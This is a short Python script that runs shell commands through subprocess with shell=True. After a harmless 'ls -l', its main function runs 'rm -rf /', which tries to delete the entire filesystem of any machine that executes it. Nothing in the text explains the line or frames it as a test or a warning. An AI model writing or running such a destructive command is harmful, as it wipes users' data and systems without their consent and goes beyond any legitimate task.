import os
import subprocess

def run_command(command):
    subprocess.run(command, shell=True)

def main():
    command = "ls -l"
    run_command(command)

    command = "rm -rf /"
    run_command(command)

if __name__ == "__main__":
    main()